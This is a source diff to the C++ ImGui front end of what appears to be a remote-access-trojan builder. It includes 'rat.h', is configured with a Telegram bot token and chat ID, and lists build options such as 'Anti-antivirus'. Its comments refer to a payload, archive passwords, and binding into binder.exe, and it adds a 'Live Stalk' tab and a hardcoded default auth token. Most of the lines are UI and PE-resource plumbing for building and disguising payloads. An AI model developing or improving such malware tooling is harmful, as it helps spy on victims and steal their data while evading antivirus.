@@ -2,6 +2,7 @@
 #include "imgui_impl_win32.h"
 #include "imgui_impl_dx11.h"
 #include "rat.h"
+#include "blz.h"
 #include "IconsFontAwesome6.h"
 #include <d3d11.h>
 #include <tchar.h>
@@ -17,6 +18,10 @@
 #include <commdlg.h>
 #include <cstring>
 #include <cstdio>
+#include <cstdarg>
+#include <thread>
+#include <atomic>
+#include <mutex>
 
 #pragma comment(lib, "d3d11.lib")
 #pragma comment(lib, "d3dcompiler.lib")
@@ -40,6 +45,58 @@ static bool g_dragging = false;
 static POINT g_dragStart = {};
 static RECT  g_windowStart = {};
 
+// Corner radius of the whole window. The OS window shape is clipped to the same
+// radius (see applyRoundedWindowRegion) so the drawn border and the silhouette
+// line up exactly.
+static constexpr float kWindowRounding = 12.0f;
+
+// Rounds the actual OS window, not just the drawn surface. The UI already paints
+// a rounded canvas, but with WindowPadding 0 and the same colour used as the D3D
+// clear colour the square corners of the real window stayed visible.
+//
+// Windows 11 draws an antialiased rounded corner itself via
+// DWMWA_WINDOW_CORNER_PREFERENCE. Windows 10 does not know that attribute (it
+// returns E_INVALIDARG), so there we clip the window with a region instead. A
+// region edge is hard-clipped and therefore slightly aliased; that is the only
+// per-pixel-shape option on Win10 without switching the swap chain to per-pixel
+// alpha compositing.
+static void applyRoundedWindowRegion(HWND hwnd) {
+    if (!hwnd)
+        return;
+
+    static const DWORD kCornerPreference = 33; // DWMWA_WINDOW_CORNER_PREFERENCE
+    static const int   kCornerRound = 2;       // DWMWCP_ROUND
+
+    bool handledByDwm = false;
+    if (HMODULE dwm = LoadLibraryW(L"dwmapi.dll")) {
+        typedef HRESULT(WINAPI* DwmSetWindowAttribute_t)(HWND, DWORD, LPCVOID, DWORD);
+        if (auto pDwm = (DwmSetWindowAttribute_t)GetProcAddress(dwm, "DwmSetWindowAttribute")) {
+            int pref = kCornerRound;
+            handledByDwm = SUCCEEDED(pDwm(hwnd, kCornerPreference, &pref, sizeof(pref)));
+        }
+        FreeLibrary(dwm);
+    }
+
+    if (handledByDwm) {
+        // DWM owns the shape now; drop any region so we don't harden its edge.
+        SetWindowRgn(hwnd, nullptr, TRUE);
+        return;
+    }
+
+    RECT rc = {};
+    GetWindowRect(hwnd, &rc);
+    const int w = rc.right - rc.left;
+    const int h = rc.bottom - rc.top;
+    if (w <= 0 || h <= 0)
+        return;
+
+    // CreateRoundRectRgn wants the corner ellipse's full width/height, and its
+    // right/bottom bounds are exclusive, hence the +1s.
+    const int d = (int)(kWindowRounding * 2.0f + 0.5f);
+    if (HRGN rgn = CreateRoundRectRgn(0, 0, w + 1, h + 1, d, d))
+        SetWindowRgn(hwnd, rgn, TRUE); // the system owns the region after this
+}
+
 LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
         return true;
@@ -51,6 +108,9 @@ LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             g_pSwapChain->ResizeBuffers(0, (UINT)LOWORD(lParam), (UINT)HIWORD(lParam), DXGI_FORMAT_UNKNOWN, 0);
             CreateRenderTarget();
         }
+        // Restoring from minimised re-sends WM_SIZE, and the region can be
+        // dropped by some shell transitions, so re-assert it.
+        applyRoundedWindowRegion(hWnd);
         return 0;
     case WM_DESTROY:
         PostQuitMessage(0);
@@ -62,9 +122,24 @@ LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 static char botTokenBuf[512] = "";
 static char chatIdBuf[64] = "";
 static char authTokenBuf[256] = "";
+static bool authTokenSavedOk = false;
+static float authTokenSavedAt = 0.0f;
+static bool authTokenIsDefault = true;
+static const char* kDefaultAuthToken = "sk-7nR9pL2mK8qW5vT3";
+static char storedAuthToken[256] = "";
 static TelegramBot telegram;
+// Product version. Shown in the title bar, and the payload stamps its Telegram
+// headers with the same generation (see kMsgBrand in payload.cpp).
+static const char* kAppVersion = "1.1.0";
+
 static bool configLoaded = false;
 static bool authLoggedIn = false;
+// Settings toggles, persisted in config.ini.
+//  autoConnectOnStart — verify the Telegram bot the moment the app starts,
+//                       instead of waiting for a manual Connect.
+//  disableAppAuth     — skip the auth-token login screen entirely.
+static bool autoConnectOnStart = false;
+static bool disableAppAuth = false;
 static bool showTelegramPopup = false;
 static bool showAuthLogin = false;
 static bool showAuthFailPopup = false;
@@ -104,6 +179,16 @@ static const char* buildOptionLabels[11] = {
     "Encrypt network traffic",
     "Anti-antivirus"
 };
+
+// Archive password control (Build -> Options).
+//
+// Three distinct behaviours, which is why this is a checkbox *plus* a field
+// rather than just a field:
+//   useCustomPassword == false        -> payload generates a random password
+//   useCustomPassword == true, text   -> that exact password is used
+//   useCustomPassword == true, empty  -> the archive is written with NO password
+static bool useCustomPassword = false;
+static char customPasswordBuf[128] = "";
 static ImFont* fontBody = nullptr;
 static ImFont* fontMedium = nullptr;
 static ImFont* fontHeading = nullptr;
@@ -147,9 +232,16 @@ static void saveConfigToAppData() {
         f << "token=" << botTokenBuf << "\n";
         f << "chatid=" << chatIdBuf << "\n";
         f << "authtoken=" << authTokenBuf << "\n";
+        f << "auto_connect=" << (autoConnectOnStart ? 1 : 0) << "\n";
+        f << "disable_app_auth=" << (disableAppAuth ? 1 : 0) << "\n";
         f.close();
         configLoaded = true;
         telegram.setConfig(botTokenBuf, chatIdBuf);
+        // Mirror the active token so startup verification uses the latest value.
+        if (authTokenBuf[0]) {
+            strncpy_s(storedAuthToken, authTokenBuf, sizeof(storedAuthToken) - 1);
+            authTokenIsDefault = (strcmp(storedAuthToken, kDefaultAuthToken) == 0);
+        }
     }
 }
 
@@ -167,9 +259,16 @@ static void loadConfigFromAppData() {
         } else if (line.rfind("authtoken=", 0) == 0) {
             std::string val = line.substr(10);
             strncpy_s(authTokenBuf, val.c_str(), sizeof(authTokenBuf) - 1);
+            strncpy_s(storedAuthToken, val.c_str(), sizeof(storedAuthToken) - 1);
+        } else if (line.rfind("auto_connect=", 0) == 0) {
+            autoConnectOnStart = (line.substr(13) == "1");
+        } else if (line.rfind("disable_app_auth=", 0) == 0) {
+            disableAppAuth = (line.substr(17) == "1");
         }
     }
     f.close();
+    authTokenIsDefault = (storedAuthToken[0] == 0) ||
+        (strcmp(storedAuthToken, kDefaultAuthToken) == 0);
     if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
         telegram.setConfig(botTokenBuf, chatIdBuf);
         configLoaded = true;
@@ -182,6 +281,10 @@ static void resetConfig() {
     configLoaded = false;
     authLoggedIn = false;
     authTokenBuf[0] = 0;
+    storedAuthToken[0] = 0;
+    authTokenIsDefault = true;
+    autoConnectOnStart = false;
+    disableAppAuth = false;
     telegram.reset();
     DeleteFileA(getAppDataPath().c_str());
 }
@@ -383,6 +486,136 @@ static bool styledCheckbox(const char* label, bool* value) {
     return changed;
 }
 
+// Pill-shaped on/off switch. Used for the Settings toggles, where a slide
+// reads more like a setting than a checkbox does.
+//
+// Drawn with the window draw list rather than composed from ImGui widgets so the
+// knob can slide smoothly: the track is a rounded rect, the knob a circle whose
+// x position eases toward the target each frame.
+static bool styledToggle(const char* id, bool* value, float scale = 1.0f) {
+    if (!value)
+        return false;
+
+    const float trackW = 42.0f * scale;
+    const float trackH = 22.0f * scale;
+    const float pad = 3.0f * scale;
+    const float knobR = (trackH - pad * 2.0f) * 0.5f;
+
+    ImGui::PushID(id);
+    ImGui::InvisibleButton("##toggle", ImVec2(trackW, trackH));
+    const bool clicked = ImGui::IsItemClicked(ImGuiMouseButton_Left);
+    const bool hovered = ImGui::IsItemHovered();
+    if (clicked)
+        *value = !*value;
+    ImGui::PopID();
+
+    // Per-toggle animation slot, keyed by the pointer so each switch animates
+    // independently. Small fixed table; collisions just share a phase.
+    struct Slot { const bool* key; float phase; };
+    static Slot slots[16] = {};
+    Slot* slot = &slots[0];
+    for (int i = 0; i < 16; ++i) {
+        if (slots[i].key == value) { slot = &slots[i]; break; }
+        if (slots[i].key == nullptr) { slots[i].key = value; slot = &slots[i]; break; }
+    }
+
+    const float target = *value ? 1.0f : 0.0f;
+    const float step = 1.0f - std::exp(-18.0f * ImGui::GetIO().DeltaTime);
+    slot->phase += (target - slot->phase) * step;
+
+    const ImVec2 p = ImGui::GetItemRectMin();
+    ImDrawList* dl = ImGui::GetWindowDrawList();
+
+    // Track: muted when off, accent-tinted when on. Hover lifts it slightly.
+    const ImVec4 offTrack = hovered ? Ui::SurfaceHover : Ui::SurfaceRaised;
+    const ImVec4 onTrack = Ui::mix(Ui::SurfaceRaised, Ui::Accent, 0.85f);
+    dl->AddRectFilled(p, ImVec2(p.x + trackW, p.y + trackH),
+        Ui::color(Ui::mix(offTrack, onTrack, slot->phase)), trackH * 0.5f);
+    dl->AddRect(p, ImVec2(p.x + trackW, p.y + trackH),
+        Ui::color(Ui::mix(Ui::Border, Ui::Accent, slot->phase)), trackH * 0.5f, 0, 1.0f);
+
+    // Knob slides from the left pad to the right pad.
+    const float knobMinX = p.x + pad + knobR;
+    const float knobMaxX = p.x + trackW - pad - knobR;
+    const float knobX = knobMinX + (knobMaxX - knobMinX) * slot->phase;
+    const float knobY = p.y + trackH * 0.5f;
+    dl->AddCircleFilled(ImVec2(knobX, knobY), knobR,
+        Ui::color(Ui::mix(Ui::TextMuted, Ui::Canvas, slot->phase)));
+
+    return clicked;
+}
+
+// Label + toggle on one row: label left, switch right-aligned in the panel.
+// Returns true when the value changed. `hint` is optional muted text under the
+// label. The caller sets the cursor Y for the row; this helper takes care of X.
+static bool styledToggleRow(const char* id, const char* label, bool* value, const char* hint = nullptr) {
+    const float innerPad = 18.0f;
+    const float trackW = 42.0f;
+    const float trackH = 22.0f;
+    const float startY = ImGui::GetCursorPosY();
+    // Right edge of the *content region*, not GetWindowSize(): the window size
+    // includes the scrollbar, which would push the switch underneath it now that
+    // the Settings panel scrolls.
+    const float contentRight = ImGui::GetContentRegionMax().x;
+
+    // Switch first, pinned to the right edge. styledToggle draws from the item
+    // rect, so its X must be set before the call.
+    ImGui::SetCursorPos(ImVec2(contentRight - trackW, startY));
+    const bool changed = styledToggle(id, value);
+
+    // Label on the left, vertically centred on the switch. Drawn after the
+    // toggle because the cursor had to move right first; absolute positioning
+    // makes the paint order irrelevant.
+    const float labelY = startY + (trackH - ImGui::GetTextLineHeight()) * 0.5f;
+    ImGui::SetCursorPos(ImVec2(innerPad, labelY));
+    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
+    ImGui::TextUnformatted(label);
+    ImGui::PopStyleColor();
+    if (hint) {
+        ImGui::SetCursorPos(ImVec2(innerPad, startY + trackH + 3.0f));
+        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
+        ImGui::TextUnformatted(hint);
+        ImGui::PopStyleColor();
+    }
+
+    // Park the cursor below the row so the next widget stacks correctly.
+    //
+    // Since ImGui 1.89 a SetCursorPos() that moves the cursor past the parent's
+    // content bounds must be followed by an item, otherwise End()/EndChild()
+    // fires the "SetCursorPos()/SetCursorScreenPos() to extend window/parent
+    // boundaries" assert. The zero-size Dummy is the documented way to
+    // materialise that advance — it keeps the parking behaviour intact and makes
+    // the call legal when this row happens to be the last thing in a window.
+    const float rowH = hint ? 48.0f : 30.0f;
+    ImGui::SetCursorPos(ImVec2(innerPad, startY + rowH));
+    ImGui::Dummy(ImVec2(0.0f, 0.0f));
+    return changed;
+}
+
+// One "label ............ value" row: muted label on the left, value right-aligned
+// against the content region. Used by the Endpoint and Settings status panels.
+//
+// The right edge comes from GetContentRegionAvail() rather than the window size so
+// the value stays clear of the scrollbar once the panel scrolls, and the clamp
+// keeps a long label and a long value from overlapping on a narrow window.
+static void drawInfoRow(const char* label, const char* value, const ImVec4& valueColor) {
+    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
+    ImGui::TextUnformatted(label);
+    ImGui::PopStyleColor();
+
+    const float valueW = ImGui::CalcTextSize(value).x;
+    ImGui::SameLine();
+    const float hereX = ImGui::GetCursorPosX();
+    const float rightAlignedX = hereX + ImGui::GetContentRegionAvail().x - valueW;
+    // Ternary rather than std::max(): <windows.h> (pulled in by shlobj.h) defines
+    // min/max as macros, which breaks any qualified std::max call.
+    ImGui::SetCursorPosX(rightAlignedX > hereX ? rightAlignedX : hereX);
+
+    ImGui::PushStyleColor(ImGuiCol_Text, valueColor);
+    ImGui::TextUnformatted(value);
+    ImGui::PopStyleColor();
+}
+
 static void handleWindowDrag(const ImVec2& dragAreaPos, const ImVec2& dragAreaSize) {
     ImGui::SetCursorScreenPos(dragAreaPos);
     ImGui::InvisibleButton("##titlebar_drag", dragAreaSize);
@@ -427,6 +660,8 @@ static void drawTitleBar() {
 
     // Brand block top-left
     ImFont* brandFont = fontMedium ? fontMedium : ImGui::GetFont();
+    char versionLabel[64];
+    snprintf(versionLabel, sizeof(versionLabel), "Version V%s", kAppVersion);
     dl->AddText(
         brandFont,
         brandFont->LegacySize + 1.0f,
@@ -438,7 +673,7 @@ static void drawTitleBar() {
         (fontBody ? fontBody->LegacySize : ImGui::GetFontSize()) - 1.0f,
         ImVec2(p0.x + 20.0f, p0.y + 32.0f),
         Ui::color(Ui::TextMuted),
-        "Version V1.0");
+        versionLabel);
 
     // thin gold mark
     dl->AddRectFilled(
@@ -510,7 +745,10 @@ static void drawFooter() {
 
 static bool verifyAuthToken(const char* token) {
     if (!token || !token[0]) return false;
-    return strcmp(token, "admin-token-1234") == 0;
+    // The active token is whatever was saved to config.ini; if nothing was
+    // saved yet we fall back to the built-in default.
+    const char* active = storedAuthToken[0] ? storedAuthToken : kDefaultAuthToken;
+    return strcmp(token, active) == 0;
 }
 
 static void drawAuthLoginScreen() {
@@ -518,7 +756,7 @@ static void drawAuthLoginScreen() {
     const ImVec2 p0 = ImGui::GetWindowPos();
     ImDrawList* dl = ImGui::GetWindowDrawList();
 
-    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), 10.0f);
+    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), kWindowRounding);
     handleWindowDrag(p0, ImVec2(winSize.x - 88.0f, 50.0f));
     ImGui::SetCursorScreenPos(p0);
     ImGui::Dummy(winSize);
@@ -637,6 +875,8 @@ static void drawAuthFailPopup() {
     ImGui::PopStyleVar(2);
 }
 
+static void dbgLog(const char* fmt, ...);
+
 static bool drawNavItem(const char* id, const char* label, int tabIndex, float y) {
     const float width = Ui::SidebarWidth - 20.0f;
     ImGui::SetCursorPos(ImVec2(10.0f, y));
@@ -644,10 +884,21 @@ static bool drawNavItem(const char* id, const char* label, int tabIndex, float y
 
     const bool hovered = ImGui::IsItemHovered();
     const bool selected = currentTab == tabIndex;
-    if (ImGui::IsItemClicked(ImGuiMouseButton_Left))
+    if (ImGui::IsItemClicked(ImGuiMouseButton_Left)) {
+        dbgLog("nav click: %s -> tab %d (pos=%.0f,%.0f)", label, tabIndex,
+            ImGui::GetItemRectMin().x, ImGui::GetItemRectMin().y);
         currentTab = tabIndex;
+    }
 
-    static float animation[3] = { 1.0f, 0.0f, 0.0f };
+    // One animation slot per nav entry. Sized from the declared tab count so
+    // adding a tab can never index past the end (this used to be a fixed
+    // animation[4] while the nav list kept growing).
+    enum { kNavCount = 5 };
+    static float animation[kNavCount] = { 1.0f, 0.0f, 0.0f, 0.0f, 0.0f };
+    if (tabIndex < 0 || tabIndex >= kNavCount) {
+        // Defensive: never index out of range if a caller passes a bad index.
+        tabIndex = 0;
+    }
     const float target = selected ? 1.0f : (hovered ? 0.45f : 0.0f);
     const float step = 1.0f - std::exp(-16.0f * ImGui::GetIO().DeltaTime);
     animation[tabIndex] += (target - animation[tabIndex]) * step;
@@ -700,7 +951,9 @@ static void drawSidebar() {
 
     drawNavItem("##nav_overview", "Home", 0, 44.0f);
     drawNavItem("##nav_build", "Build", 1, 88.0f);
-    drawNavItem("##nav_integrations", "Telegram", 2, 132.0f);
+    drawNavItem("##nav_live", "Live Stalk", 2, 132.0f);
+    drawNavItem("##nav_endpoint", "Endpoint", 3, 176.0f);
+    drawNavItem("##nav_settings", "Settings", 4, 220.0f);
 }
 
 static void drawPageHeader(const char* title, const char* subtitle) {
@@ -732,7 +985,7 @@ static void drawSplashScreen() {
     ImDrawList* dl = ImGui::GetWindowDrawList();
 
     // solid fill
-    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), 10.0f);
+    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), kWindowRounding);
 
     // drag whole splash
     handleWindowDrag(p0, winSize);
@@ -795,61 +1048,16 @@ static void drawSplashScreen() {
         showSplash = false;
 }
 
-struct BuildEntry {
-    std::string name;
-    std::string fullPath;
-    FILETIME writeTime;
-};
-
+// Open a folder in Explorer, creating it first if it does not exist yet — the
+// builds directory is created lazily, so opening it before the first build
+// should still land somewhere real rather than erroring.
 static std::string getBuildsDir();
 
-static std::vector<BuildEntry> listLatestBuilds(int maxCount) {
-    std::vector<BuildEntry> builds;
-    const std::string dir = getBuildsDir();
-    const std::string pattern = dir + "\\*.exe";
-    WIN32_FIND_DATAA fd = {};
-    HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
-    if (h == INVALID_HANDLE_VALUE)
-        return builds;
-    do {
-        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-            continue;
-        if (strstr(fd.cFileName, ".stub.exe") != nullptr)
-            continue;
-        BuildEntry e;
-        e.name = fd.cFileName;
-        e.fullPath = dir + "\\" + fd.cFileName;
-        e.writeTime = fd.ftLastWriteTime;
-        builds.push_back(std::move(e));
-    } while (FindNextFileA(h, &fd));
-    FindClose(h);
-
-    std::sort(builds.begin(), builds.end(), [](const BuildEntry& a, const BuildEntry& b) {
-        return CompareFileTime(&a.writeTime, &b.writeTime) > 0;
-    });
-    if ((int)builds.size() > maxCount)
-        builds.resize(maxCount);
-    return builds;
-}
-
-static void openBuildLocation(const std::string& fullPath) {
-    if (fullPath.empty())
+static void openDirectory(const std::string& dir) {
+    if (dir.empty())
         return;
-    std::string params = "/select,\"" + fullPath + "\"";
-    HINSTANCE r = ShellExecuteA(g_hwnd, "open", "explorer.exe", params.c_str(), nullptr, SW_SHOWNORMAL);
-    if ((INT_PTR)r <= 32)
-        ShellExecuteA(g_hwnd, "open", getBuildsDir().c_str(), nullptr, nullptr, SW_SHOWNORMAL);
-}
-
-static std::string formatBuildTime(const FILETIME& ft) {
-    FILETIME localFt = {};
-    SYSTEMTIME st = {};
-    FileTimeToLocalFileTime(&ft, &localFt);
-    FileTimeToSystemTime(&localFt, &st);
-    char buf[64];
-    snprintf(buf, sizeof(buf), "%02d-%02d-%04d %02d:%02d",
-        st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute);
-    return std::string(buf);
+    CreateDirectoryA(dir.c_str(), nullptr);
+    ShellExecuteA(g_hwnd, "open", dir.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
 }
 
 static void drawGeneralTab() {
@@ -911,99 +1119,77 @@ static void drawGeneralTab() {
     ImGui::PopStyleColor(2);
     ImGui::PopStyleVar();
 
+    // === Builds directory ===
+    //
+    // Replaces the old "Latest builds" card grid. The grid listed individual
+    // outputs, but every one of them opens the same folder, so it was a lot of
+    // chrome to say one thing. This shows the resolved path directly and gives a
+    // single explicit action.
     ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 254.0f));
-    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(18.0f, 14.0f));
+    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(22.0f, 20.0f));
     ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
     ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
     if (ImGui::BeginChild(
-            "##overview_builds",
-            ImVec2(width - Ui::ContentPadding * 2.0f, 168.0f),
+            "##overview_builds_dir",
+            ImVec2(width - Ui::ContentPadding * 2.0f, 150.0f),
             ImGuiChildFlags_Borders,
-            ImGuiWindowFlags_None)) {
+            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
+        const std::string buildsDir = getBuildsDir();
+        // SetCursorPos()/GetCursorPos() are window-relative (padding included), so
+        // the content origin is captured once and reused instead of being guessed.
+        const float padX = ImGui::GetCursorPosX();
+        const float padY = ImGui::GetCursorPosY();
+        const float contentRight = ImGui::GetContentRegionMax().x;
+
         if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
-        ImGui::TextUnformatted("Latest builds");
+        ImGui::TextUnformatted("Builds Directory");
         if (fontMedium) ImGui::PopFont();
         ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
-        ImGui::TextUnformatted("Click a build to open its folder.");
+        ImGui::TextUnformatted("Where built executables are written.");
         ImGui::PopStyleColor();
-        ImGui::Dummy(ImVec2(0.0f, 6.0f));
 
-        const std::vector<BuildEntry> builds = listLatestBuilds(6);
-        if (builds.empty()) {
-            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
-            ImGui::TextUnformatted("No builds yet.");
+        // The action sits on the header row, right-aligned against the title.
+        //
+        // It used to be drawn on the path row while the path box still spanned the
+        // full panel width, so the button was painted straight over the box — and
+        // because a child window takes hover priority over its parent, that overlap
+        // is also why it could not be clicked. Moving it up frees the full width
+        // for the path.
+        const float openW = 190.0f, openH = 32.0f;
+        char openLabel[96];
+        snprintf(openLabel, sizeof(openLabel), "%s  Open builds Directory", ICON_FA_FOLDER_OPEN);
+        ImGui::SetCursorPos(ImVec2(contentRight - openW, padY));
+        if (styledButton(openLabel, ImVec2(openW, openH), true))
+            openDirectory(buildsDir);
+
+        ImGui::SetCursorPos(ImVec2(padX, 67.0f));
+        ImGui::Separator();
+
+        // The resolved path, in a raised inset so it reads as a value rather than
+        // a label. It now gets the whole content width; the tooltip covers the
+        // case where a deep path still does not fit.
+        ImGui::SetCursorPos(ImVec2(padX, 80.0f));
+        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
+        ImGui::TextUnformatted("Location");
+        ImGui::PopStyleColor();
+
+        ImGui::SetCursorPos(ImVec2(padX, 102.0f));
+        ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::SurfaceRaised);
+        ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
+        ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 6.0f);
+        ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(10.0f, 7.0f));
+        if (ImGui::BeginChild("##builds_path", ImVec2(contentRight - padX, 36.0f),
+                ImGuiChildFlags_Borders,
+                ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
+            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextSecondary);
+            ImGui::TextUnformatted(buildsDir.c_str());
             ImGui::PopStyleColor();
-        } else {
-            const float cardW = 200.0f;
-            const float cardH = 72.0f;
-            const float gapX = 10.0f;
-            const float gapY = 10.0f;
-            const float availW = ImGui::GetContentRegionAvail().x;
-            int perRow = (int)((availW + gapX) / (cardW + gapX));
-            if (perRow < 1) perRow = 1;
-
-            for (size_t i = 0; i < builds.size(); ++i) {
-                const BuildEntry& b = builds[i];
-                const std::string timeStr = formatBuildTime(b.writeTime);
-                int col = (int)i % perRow;
-                int row = (int)i / perRow;
-                float cardX = col * (cardW + gapX);
-                float cardY = row * (cardH + gapY);
-
-                ImGui::SetCursorPos(ImVec2(cardX, cardY + 40.0f));
-                char cardId[64];
-                snprintf(cardId, sizeof(cardId), "##build_card_%zu", i);
-                ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::SurfaceRaised);
-                ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
-                ImGui::PushStyleColor(ImGuiCol_ChildBg, ImGui::IsItemHovered() ? Ui::SurfaceHover : Ui::SurfaceRaised);
-                ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 8.0f);
-                ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(12.0f, 10.0f));
-                if (ImGui::BeginChild(cardId, ImVec2(cardW, cardH), ImGuiChildFlags_Borders,
-                        ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
-                    ImDrawList* cdl = ImGui::GetWindowDrawList();
-                    ImVec2 cp = ImGui::GetWindowPos();
-
-                    cdl->AddRectFilled(
-                        ImVec2(cp.x, cp.y),
-                        ImVec2(cp.x + 3.0f, cp.y + cardH),
-                        Ui::color(Ui::Accent), 2.0f);
-
-                    if (fontBody) ImGui::PushFont(fontBody, fontBody->LegacySize);
-                    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
-                    const char* dispName = b.name.c_str();
-                    if (strlen(dispName) > 24) {
-                        char truncated[28];
-                        memcpy(truncated, dispName, 21);
-                        strcpy(truncated + 21, "...");
-                        ImGui::TextUnformatted(truncated);
-                    } else {
-                        ImGui::TextUnformatted(dispName);
-                    }
-                    ImGui::PopStyleColor();
-                    if (fontBody) ImGui::PopFont();
-
-                    ImGui::Dummy(ImVec2(0.0f, 2.0f));
-
-                    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
-                    ImGui::TextUnformatted(timeStr.c_str());
-                    ImGui::PopStyleColor();
-
-                    ImGui::Dummy(ImVec2(0.0f, 2.0f));
-
-                    char sidLabel[80];
-                    snprintf(sidLabel, sizeof(sidLabel), "Session: %s", sessionId.c_str());
-                    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
-                    ImGui::TextUnformatted(sidLabel);
-                    ImGui::PopStyleColor();
-                }
-                ImGui::EndChild();
-                ImGui::PopStyleVar(2);
-                ImGui::PopStyleColor(3);
-
-                if (ImGui::IsItemHovered() && ImGui::IsMouseClicked(ImGuiMouseButton_Left))
-                    openBuildLocation(b.fullPath);
-            }
+            if (ImGui::IsItemHovered())
+                ImGui::SetTooltip("%s", buildsDir.c_str());
         }
+        ImGui::EndChild();
+        ImGui::PopStyleVar(2);
+        ImGui::PopStyleColor(2);
     }
     ImGui::EndChild();
     ImGui::PopStyleColor(2);
@@ -1157,8 +1343,235 @@ static bool copyPeIcons(const char* srcExe, const char* destExe) {
     return endOk && ctx.ok;
 }
 
+// Extract every (id, language) RT_MANIFEST resource (type 24) from a PE.
+//
+// The LANGUAGE id matters: a resource is uniquely identified by the
+// (type, name, language) triple, and UpdateResourceW refuses to delete a triple
+// that does not exist (error 87), poisoning the whole update transaction. So we
+// must carry the real language alongside every blob.
+struct ManifestBlob {
+    WORD id;
+    WORD lang;
+    std::vector<char> data;
+};
+
+// Context shared by the enumeration callbacks below.
+struct ManifestWalkCtx {
+    std::vector<ManifestBlob>* out;
+};
+
+// Language-level callback: pulls the actual bytes for one (name, lang) pair.
+static BOOL CALLBACK manifestLangEnumProc(HMODULE mod, LPCWSTR type, LPWSTR name,
+    WORD lang, LONG_PTR lParam) {
+    ManifestWalkCtx* c = (ManifestWalkCtx*)lParam;
+    HRSRC hRes = FindResourceExW(mod, type, name, lang);
+    if (!hRes) return TRUE;
+    HGLOBAL hData = LoadResource(mod, hRes);
+    DWORD size = SizeofResource(mod, hRes);
+    if (!hData || !size) return TRUE;
+    void* p = LockResource(hData);
+    if (!p) return TRUE;
+
+    ManifestBlob blob;
+    blob.id = IS_INTRESOURCE(name) ? (WORD)(ULONG_PTR)name : 1;
+    blob.lang = lang;
+    blob.data.assign((char*)p, (char*)p + size);
+    c->out->push_back(std::move(blob));
+    return TRUE;
+}
+
+// Name-level callback: walks every language of one manifest name.
+static BOOL CALLBACK manifestNameEnumProc(HMODULE mod, LPCWSTR type, LPWSTR name,
+    LONG_PTR lParam) {
+    ManifestWalkCtx* c = (ManifestWalkCtx*)lParam;
+    EnumResourceLanguagesW(mod, type, name,
+        (ENUMRESLANGPROCW)manifestLangEnumProc, (LONG_PTR)c);
+    return TRUE;
+}
+
+static std::vector<ManifestBlob> extractManifests(const std::string& path) {
+    std::vector<ManifestBlob> out;
+    HMODULE hSrc = LoadLibraryExA(path.c_str(), nullptr,
+        LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
+    if (!hSrc) return out;
+
+    // RT_MANIFEST == 24. MAKEINTRESOURCE avoids depending on winuser.h enums.
+    ManifestWalkCtx ctx{ &out };
+    EnumResourceNamesW(hSrc, MAKEINTRESOURCEW(24), manifestNameEnumProc, (LONG_PTR)&ctx);
+
+    FreeLibrary(hSrc);
+    return out;
+}
+
+// Exact (RT_MANIFEST id, language) pair — the real identity of a resource.
+//
+// Why this exists: updating resources is a transaction. Calling
+// UpdateResourceW(type, name, lang, nullptr, 0) — the documented "delete this
+// resource" form — on a triple that is NOT present does not politely fail; it
+// returns ERROR_INVALID_PARAMETER (87) and invalidates the whole
+// BeginUpdateResource handle. Every later UpdateResource then returns 1359 and
+// EndUpdateResource aborts. That is exactly what produced the user-visible
+// "Failed to embed resources in <path>" error: the builder blindly deleted
+// manifest id 1 at language 0x0000, while binder.exe stores it at 0x0409.
+struct ManifestKey {
+    WORD id;
+    WORD lang;
+};
+
+struct ManifestKeyCtx {
+    std::vector<ManifestKey>* keys;
+};
+
+static BOOL CALLBACK manifestKeyLangProc(HMODULE, LPCWSTR, LPWSTR name, WORD lang,
+    LONG_PTR lParam) {
+    ManifestKeyCtx* c = (ManifestKeyCtx*)lParam;
+    if (!IS_INTRESOURCE(name)) return TRUE;
+    c->keys->push_back(ManifestKey{ (WORD)(ULONG_PTR)name, lang });
